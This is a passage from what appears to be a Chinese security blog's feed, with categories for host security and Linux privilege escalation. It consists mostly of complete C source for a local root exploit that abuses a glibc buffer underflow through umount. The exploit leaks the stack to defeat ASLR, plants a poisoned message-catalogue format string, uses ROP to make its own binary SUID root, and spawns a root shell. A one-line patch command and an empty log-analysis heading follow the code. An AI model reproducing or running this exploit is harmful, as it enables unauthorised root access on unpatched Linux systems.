status.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">attemptEscalation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> escalationSuccess=<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> targetCwd[<span class="number">64</span>];</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">      targetCwd, <span class="keyword">sizeof</span>(targetCwd)<span class="number">-1</span>, <span class="string">&quot;/proc/%d/cwd&quot;</span>, namespacedProcessPid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> pipeFds[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> result=pipe(pipeFds);</span><br><span class="line">  assert(!result);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pid_t</span> childPid=fork();</span><br><span class="line">  assert(childPid&gt;=<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(!childPid) &#123;</span><br><span class="line"><span class="comment">// This is the child process.</span></span><br><span class="line">    close(pipeFds[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Starting subprocess\n&quot;</span>);</span><br><span class="line">    dup2(pipeFds[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">    dup2(pipeFds[<span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">    close(pipeFds[<span class="number">1</span>]);</span><br><span class="line">    result=chdir(targetCwd);</span><br><span class="line">    assert(!result);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create so many environment variables for a kind of &quot;stack spraying&quot;.</span></span><br><span class="line">    <span class="keyword">int</span> envCount=UMOUNT_ENV_VAR_COUNT;</span><br><span class="line">    <span class="keyword">char</span> **umountEnv=(<span class="keyword">char</span>**)<span class="built_in">malloc</span>((envCount+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">    assert(umountEnv);</span><br><span class="line">    umountEnv[envCount--]=<span class="literal">NULL</span>;</span><br><span class="line">    umountEnv[envCount--]=<span class="string">&quot;LC_ALL=C.UTF-8&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(envCount&gt;=<span class="number">0</span>) &#123;</span><br><span class="line">      umountEnv[envCount--]=<span class="string">&quot;AANGUAGE=X.X&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// Use the built-in C locale.</span></span><br><span class="line"><span class="comment">// Invoke umount first by overwriting heap downwards using links</span></span><br><span class="line"><span class="comment">// for &quot;down&quot;, then retriggering another error message (&quot;busy&quot;)</span></span><br><span class="line"><span class="comment">// with hopefully similar same stack layout for other path &quot;/&quot;.</span></span><br><span class="line">    <span class="keyword">char</span>* umountArgs[]=&#123;umountPathname, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;down&quot;</span>, <span class="string">&quot;LABEL=78&quot;</span>, <span class="string">&quot;LABEL=789&quot;</span>, <span class="string">&quot;LABEL=789a&quot;</span>, <span class="string">&quot;LABEL=789ab&quot;</span>, <span class="string">&quot;LABEL=789abc&quot;</span>, <span class="string">&quot;LABEL=789abcd&quot;</span>, <span class="string">&quot;LABEL=789abcde&quot;</span>, <span class="string">&quot;LABEL=789abcdef&quot;</span>, <span class="string">&quot;LABEL=789abcdef0&quot;</span>, <span class="string">&quot;LABEL=789abcdef0&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    result=execve(umountArgs[<span class="number">0</span>], umountArgs, umountEnv);</span><br><span class="line">    assert(!result);</span><br><span class="line">  &#125;</span><br><span class="line">  close(pipeFds[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">int</span> childStdout=pipeFds[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> escalationPhase=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> readBuffer[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">int</span> readDataLength=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> stackData[STACK_LONG_DUMP_BYTES];</span><br><span class="line">  <span class="keyword">int</span> stackDataBytes=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollFdList</span>[1];</span></span><br><span class="line">  pollFdList[<span class="number">0</span>].fd=childStdout;</span><br><span class="line">  pollFdList[<span class="number">0</span>].events=POLLIN;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now learn about the binary, prepare data for second exploitation</span></span><br><span class="line"><span class="comment">// phase. The phases should be:</span></span><br><span class="line"><span class="comment">// * 0: umount executes, glibc underflows and causes an util-linux.mo</span></span><br><span class="line"><span class="comment">//   file to be read, that contains a poisonous format string.</span></span><br><span class="line"><span class="comment">//   Successful poisoning results in writing of 8*&#x27;A&#x27; preamble,</span></span><br><span class="line"><span class="comment">//   we are looking for to indicate end of this phase.</span></span><br><span class="line"><span class="comment">// * 1: The poisoned process writes out stack content to defeat</span></span><br><span class="line"><span class="comment">//   ASLR. Reading all relevant stack end this phase.</span></span><br><span class="line"><span class="comment">// * 2: The poisoned process changes the &quot;LANGUAGE&quot; parameter,</span></span><br><span class="line"><span class="comment">//   thus triggering re-read of util-linux.mo. To avoid races,</span></span><br><span class="line"><span class="comment">//   we let umount open a named pipe, thus blocking execution.</span></span><br><span class="line"><span class="comment">//   As soon as the pipe is ready for writing, we write a modified</span></span><br><span class="line"><span class="comment">//   version of util-linux.mo to another file because the pipe</span></span><br><span class="line"><span class="comment">//   cannot be used for sending the content.</span></span><br><span class="line"><span class="comment">// * 3: We read umount output to avoid blocking the process and</span></span><br><span class="line"><span class="comment">//   wait for it to ROP execute fchown/fchmod and exit.</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(escalationPhase==<span class="number">2</span>) &#123;</span><br><span class="line"><span class="comment">// We cannot use the standard poll from below to monitor the pipe,</span></span><br><span class="line"><span class="comment">// but also we do not want to block forever. Wait for the pipe</span></span><br><span class="line"><span class="comment">// in nonblocking mode and then continue with next phase.</span></span><br><span class="line">      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);</span><br><span class="line">      <span class="keyword">if</span>(result) &#123;</span><br><span class="line">        <span class="keyword">goto</span> attemptEscalationCleanup;</span><br><span class="line">      &#125;</span><br><span class="line">      escalationPhase++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait at most 10 seconds for IO.</span></span><br><span class="line">    result=poll(pollFdList, <span class="number">1</span>, <span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">if</span>(!result) &#123;</span><br><span class="line"><span class="comment">// We ran into a timeout. This might be the result of a deadlocked</span></span><br><span class="line"><span class="comment">// child, so kill the child and retry.</span></span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Poll timed out\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> attemptEscalationCleanup;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// Perform the IO operations without blocking.</span></span><br><span class="line">    <span class="keyword">if</span>(pollFdList[<span class="number">0</span>].revents&amp;(POLLIN|POLLHUP)) &#123;</span><br><span class="line">      result=read(</span><br><span class="line">          pollFdList[<span class="number">0</span>].fd, readBuffer+readDataLength,</span><br><span class="line">          <span class="keyword">sizeof</span>(readBuffer)-readDataLength);</span><br><span class="line">      <span class="keyword">if</span>(!result) &#123;</span><br><span class="line">        <span class="keyword">if</span>(escalationPhase&lt;<span class="number">3</span>) &#123;</span><br><span class="line"><span class="comment">// Child has closed the socket unexpectedly.</span></span><br><span class="line">          <span class="keyword">goto</span> attemptEscalationCleanup;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(result&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;IO error talking to child\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> attemptEscalationCleanup;</span><br><span class="line">      &#125;</span><br><span class="line">      readDataLength+=result;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle the data depending on escalation phase.</span></span><br><span class="line">      <span class="keyword">int</span> moveLength=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">switch</span>(escalationPhase) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// Initial sync: read A*8 preamble.</span></span><br><span class="line">          <span class="keyword">if</span>(readDataLength&lt;<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="keyword">char</span> *preambleStart=memmem(readBuffer, readDataLength,</span><br><span class="line">              <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>);</span><br><span class="line">          <span class="keyword">if</span>(!preambleStart) &#123;</span><br><span class="line"><span class="comment">// No preamble, move content only if buffer is full.</span></span><br><span class="line">            <span class="keyword">if</span>(readDataLength==<span class="keyword">sizeof</span>(readBuffer))</span><br><span class="line">              moveLength=readDataLength<span class="number">-7</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line"><span class="comment">// We found, what we are looking for. Start reading the stack.</span></span><br><span class="line">          escalationPhase++;</span><br><span class="line">          moveLength=preambleStart-readBuffer+<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Read the stack.</span></span><br><span class="line"><span class="comment">// Consume stack data until or local array is full.</span></span><br><span class="line">          <span class="keyword">while</span>(moveLength+<span class="number">16</span>&lt;=readDataLength) &#123;</span><br><span class="line">            result=<span class="built_in">sscanf</span>(readBuffer+moveLength, <span class="string">&quot;%016lx&quot;</span>,</span><br><span class="line">                (<span class="keyword">int</span>*)(stackData+stackDataBytes));</span><br><span class="line">            <span class="keyword">if</span>(result!=<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Scanning failed, the data injection procedure apparently did</span></span><br><span class="line"><span class="comment">// not work, so this escalation failed.</span></span><br><span class="line">              <span class="keyword">goto</span> attemptEscalationCleanup;</span><br><span class="line">            &#125;</span><br><span class="line">            moveLength+=<span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>;</span><br><span class="line">            stackDataBytes+=<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"><span class="comment">// See if we reached end of stack dump already.</span></span><br><span class="line">            <span class="keyword">if</span>(stackDataBytes==<span class="keyword">sizeof</span>(stackData))</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(stackDataBytes!=<span class="keyword">sizeof</span>(stackData))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// All data read, use it to prepare the content for the next phase.</span></span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Stack content received, calculating next phase\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">int</span> *exploitOffsets=(<span class="keyword">int</span>*)osReleaseExploitData[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the address, where source Pointer is pointing to.</span></span><br><span class="line">          <span class="keyword">void</span> *sourcePointerTarget=((<span class="keyword">void</span>**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];</span><br><span class="line"><span class="comment">// This is the stack address source for the target pointer.</span></span><br><span class="line">          <span class="keyword">void</span> *sourcePointerLocation=sourcePointerTarget<span class="number">-0xd0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">void</span> *targetPointerTarget=((<span class="keyword">void</span>**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];</span><br><span class="line"><span class="comment">// This is the stack address of the libc start function return</span></span><br><span class="line"><span class="comment">// pointer.</span></span><br><span class="line">          <span class="keyword">void</span> *libcStartFunctionReturnAddressSource=sourcePointerLocation<span class="number">-0x10</span>;</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Found source address location %p pointing to target address %p with value %p, libc offset is %p\n&quot;</span>,</span><br><span class="line">              sourcePointerLocation, sourcePointerTarget,</span><br><span class="line">              targetPointerTarget, libcStartFunctionReturnAddressSource);</span><br><span class="line"><span class="comment">// So the libcStartFunctionReturnAddressSource is the lowest address</span></span><br><span class="line"><span class="comment">// to manipulate, targetPointerTarget+...</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">void</span> *libcStartFunctionAddress=((<span class="keyword">void</span>**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]<span class="number">-2</span>];</span><br><span class="line">          <span class="keyword">void</span> *stackWriteData[]=&#123;</span><br><span class="line">              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],</span><br><span class="line">              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Changing return address from %p to %p, %p\n&quot;</span>,</span><br><span class="line">              libcStartFunctionAddress, stackWriteData[<span class="number">0</span>],</span><br><span class="line">              stackWriteData[<span class="number">1</span>]);</span><br><span class="line">          escalationPhase++;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">char</span> *escalationString=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">          createStackWriteFormatString(</span><br><span class="line">              escalationString, <span class="number">1024</span>,</span><br><span class="line">              exploitOffsets[ED_STACK_OFFSET_ARGV]+<span class="number">1</span>, <span class="comment">// Stack position of argv pointer argument for fprintf</span></span><br><span class="line">              sourcePointerTarget, <span class="comment">// Base value to write</span></span><br><span class="line">              exploitOffsets[ED_STACK_OFFSET_ARG0]+<span class="number">1</span>, <span class="comment">// Stack position of argv[0] pointer ...</span></span><br><span class="line">              libcStartFunctionReturnAddressSource,</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">short</span>*)stackWriteData,</span><br><span class="line">              <span class="keyword">sizeof</span>(stackWriteData)/<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">short</span>)</span><br><span class="line">          );</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Using escalation string %s&quot;</span>, escalationString);</span><br><span class="line"></span><br><span class="line">          result=writeMessageCatalogue(</span><br><span class="line">              secondPhaseCataloguePathname,</span><br><span class="line">              (<span class="keyword">char</span>*[])&#123;</span><br><span class="line">                  <span class="string">&quot;%s: mountpoint not found&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;%s: not mounted&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">              (<span class="keyword">char</span>*[])&#123;</span><br><span class="line">                  escalationString,</span><br><span class="line">                  <span class="string">&quot;BBBB5678%3$s\n&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;BBBBABCD%s\n&quot;</span>&#125;,</span><br><span class="line">              <span class="number">3</span>);</span><br><span class="line">          assert(!result);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="comment">// Wait for pipe connection and output any result from mount.</span></span><br><span class="line">          readDataLength=<span class="number">0</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Logic error, state %d\n&quot;</span>, escalationPhase);</span><br><span class="line">          <span class="keyword">goto</span> attemptEscalationCleanup;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(moveLength) &#123;</span><br><span class="line">        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);</span><br><span class="line">        readDataLength-=moveLength;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">attemptEscalationCleanup:</span><br><span class="line"><span class="comment">// Wait some time to avoid killing umount even when exploit was</span></span><br><span class="line"><span class="comment">// successful.</span></span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  close(childStdout);</span><br><span class="line"><span class="comment">// It is safe to kill the child as we did not wait for it to finish</span></span><br><span class="line"><span class="comment">// yet, so at least the zombie process is still here.</span></span><br><span class="line">  kill(childPid, SIGKILL);</span><br><span class="line">  <span class="keyword">pid_t</span> waitedPid=waitpid(childPid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  assert(waitedPid==childPid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>(escalationSuccess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** This function invokes the shell specified via environment</span></span><br><span class="line"><span class="comment"> *  or the default shell &quot;/bin/sh&quot; when undefined. The function</span></span><br><span class="line"><span class="comment"> *  does not return on success.</span></span><br><span class="line"><span class="comment"> *  @return -1 on error</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">invokeShell</span><span class="params">(<span class="keyword">char</span> *shellName)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!shellName)</span><br><span class="line">    shellName=getenv(<span class="string">&quot;SHELL&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!shellName)</span><br><span class="line">    shellName=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  <span class="keyword">char</span>* shellArgs[]=&#123;shellName, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(shellName, shellArgs, environ);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to launch shell %s\n&quot;</span>, shellName);</span><br><span class="line">  <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *programmName=argv[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">int</span> exitStatus=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(getuid()==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: you are already root, invoking shell ...\n&quot;</span>,</span><br><span class="line">        programmName);</span><br><span class="line">    invokeShell(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(geteuid()==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statBuf</span>;</span></span><br><span class="line">    <span class="keyword">int</span> result=stat(<span class="string">&quot;/proc/self/exe&quot;</span>, &amp;statBuf);</span><br><span class="line">    assert(!result);</span><br><span class="line">    <span class="keyword">if</span>(statBuf.st_uid||statBuf.st_gid) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: internal invocation, setting SUID mode\n&quot;</span>,</span><br><span class="line">          programmName);</span><br><span class="line">      <span class="keyword">int</span> handle=open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">      fchown(handle, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      fchmod(handle, <span class="number">04755</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: invoked as SUID, invoking shell ...\n&quot;</span>,</span><br><span class="line">        programmName);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    invokeShell(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> argPos=<span class="number">1</span>; argPos&lt;argc;) &#123;</span><br><span class="line">    <span class="keyword">char</span> *argName=argv[argPos++];</span><br><span class="line">    <span class="keyword">if</span>(argPos==argc) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s requires parameter\n&quot;</span>, argName);</span><br><span class="line">      <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;--Pid&quot;</span>, argName)) &#123;</span><br><span class="line">      <span class="keyword">char</span> *endPtr;</span><br><span class="line">      namespacedProcessPid=strtoll(argv[argPos++], &amp;endPtr, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span>((errno)||(*endPtr)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Invalid pid value\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      killNamespacedProcessFlag=<span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unknown argument %s\n&quot;</span>, argName);</span><br><span class="line">      <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: setting up environment ...\n&quot;</span>, programmName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!osRelease) &#123;</span><br><span class="line">    <span class="keyword">if</span>(detectOsRelease()) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to detect OS version, continuing anyway\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  umountPathname=findUmountBinaryPathname(<span class="string">&quot;/bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>((!umountPathname)&amp;&amp;(getenv(<span class="string">&quot;PATH&quot;</span>)))</span><br><span class="line">    umountPathname=findUmountBinaryPathname(getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span>(!umountPathname) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to locate \&quot;umount\&quot; binary, is PATH correct?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> preReturnCleanup;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: using umount at \&quot;%s\&quot;.\n&quot;</span>, programmName,</span><br><span class="line">      umountPathname);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pid_t</span> nsPid=prepareNamespacedProcess();</span><br><span class="line">  <span class="keyword">if</span>(nsPid&lt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">goto</span> preReturnCleanup;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Gaining root can still fail due to ASLR creating additional</span></span><br><span class="line"><span class="comment">// path separators in memory addresses residing in area to be</span></span><br><span class="line"><span class="comment">// overwritten by buffer underflow. Retry regaining until this</span></span><br><span class="line"><span class="comment">// executable changes uid/gid.</span></span><br><span class="line">  <span class="keyword">int</span> escalateMaxAttempts=<span class="number">10</span>;</span><br><span class="line">  <span class="keyword">int</span> excalateCurrentAttempt=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(excalateCurrentAttempt&lt;escalateMaxAttempts) &#123;</span><br><span class="line">    excalateCurrentAttempt++;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Attempting to gain root, try %d of %d ...\n&quot;</span>,</span><br><span class="line">        excalateCurrentAttempt, escalateMaxAttempts);</span><br><span class="line"></span><br><span class="line">    attemptEscalation();</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statBuf</span>;</span></span><br><span class="line">    <span class="keyword">int</span> statResult=stat(<span class="string">&quot;/proc/self/exe&quot;</span>, &amp;statBuf);</span><br><span class="line">       <span class="function"><span class="keyword">int</span> <span class="title">stat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, struct stat *buf)</span></span>;</span><br><span class="line">    <span class="keyword">if</span>(statResult) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(statBuf.st_uid==<span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Executable now root-owned\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> escalateOk;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Escalation FAILED, maybe target system not (yet) supported by exploit!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">preReturnCleanup:</span><br><span class="line">  <span class="keyword">if</span>(namespacedProcessPid&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(killNamespacedProcessFlag) &#123;</span><br><span class="line">      kill(namespacedProcessPid, SIGKILL);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// We used an existing namespace or chroot to escalate. Remove</span></span><br><span class="line"><span class="comment">// the files created there.</span></span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;No namespace cleanup for preexisting namespaces yet, do it manually.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!exitStatus) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Cleanup completed, re-invoking binary\n&quot;</span>);</span><br><span class="line">    invokeShell(<span class="string">&quot;/proc/self/exe&quot;</span>);</span><br><span class="line">    exitStatus=<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>(exitStatus);</span><br><span class="line"></span><br><span class="line">escalateOk:</span><br><span class="line">  exitStatus=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> preReturnCleanup;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>使用 libc 包打补丁 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get upgrade -y</span><br></pre></td></tr></table></figure><h2 id="日志特征"><a href="#日志特征" class="headerlink" title="日志特征"></a>日志特征</h2>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-18955</title>
      <link href="/p/fdcce46a.html"/>
      <url>/p/fdcce46a.html</url>
      
